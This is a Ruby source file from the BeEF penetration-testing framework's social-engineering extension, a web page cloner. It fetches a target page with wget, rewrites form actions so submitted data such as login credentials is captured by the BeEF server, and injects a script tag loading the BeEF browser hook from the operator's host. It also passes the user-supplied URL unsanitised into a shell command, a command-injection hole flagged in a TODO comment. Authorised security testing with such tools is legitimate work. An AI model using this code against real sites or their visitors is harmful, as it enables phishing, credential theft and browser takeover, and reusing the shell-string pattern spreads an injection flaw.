#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
  module Extension
    module SocialEngineering
      class WebCloner
        include Singleton


        def initialize
          @http_server = BeEF::Core::Server.instance
          @config = BeEF::Core::Configuration.instance
          @cloned_pages_dir = "#{File.expand_path('../../../../extensions/social_engineering/web_cloner', __FILE__)}/cloned_pages/"
        end

        def clone_page(url)
          print_info "Cloning page at URL #{url}"
          uri = URI(url)
          output = uri.host
          output_mod = "#{output}_mod"
          user_agent = @config.get('beef.extension.social_engineering.web_cloner.user_agent')

          #todo: prevent command injection using IO.popen passing an array of arguments
          # see here: http://devblog.avdi.org/2012/03/29/generating-cows-with-io-popen/
          wget = "wget '#{url}' --no-check-certificate -c -k -U '#{user_agent}' -O #{@cloned_pages_dir + output}"
          IO.popen(wget.to_s) { |f| result = f.gets }

          File.open("#{@cloned_pages_dir + output_mod}", 'w') do |out_file|
            File.open("#{@cloned_pages_dir + output}", 'r').each do |line|
              # Modify the <form> line changing the action URI to / in order to be properly intercepted by BeEF
              if line.include?("<form ")
                line_attrs = line.split(" ")
                count = 0
                #probably doable also with map!
                line_attrs.each do |attr|
                  if attr.include? "action=\""
                    print_info "Form action found."
                    break
                  end
                  count += 1
                end
                line_attrs[count] = "action=\"/#{output}\""
                mod_form = line_attrs.join(" ")
                print_info "Form action value changed to / in order to be intercepted."
                out_file.print mod_form
              # Add the BeEF hook
              elsif line.include?("</head>") && @config.get('beef.extension.social_engineering.web_cloner.add_beef_hook')
                out_file.print add_beef_hook(line)
                print_info "Added BeEF hook."
              else
                out_file.print line
              end
            end
          end
          print_info "Page at URL [#{url}] has been cloned. Modified HTML in [cloned_paged/#{output_mod}]"

          file_path = @cloned_pages_dir + output_mod # the path to the cloned_pages directory where we have the HTML to serve
          @http_server.mount("/#{output}", BeEF::Extension::SocialEngineering::Interceptor.new(file_path, url))
          print_info "Mounting cloned page on URL [/#{output}]"
          @http_server.remap
        end

        private
        # Replace </head> with <BeEF_hook></head>
        def add_beef_hook(line)
           host = @config.get('beef.http.host')
           port = @config.get('beef.http.port')
           js = @config.get('beef.http.hook_file')
           hook = "http://#{host}:#{port}#{js}"
           line.gsub!("</head>","<script type=\"text/javascript\" src=\"#{hook}\"></script>\n</head>")
           line
        end

      end
    end
  end
end

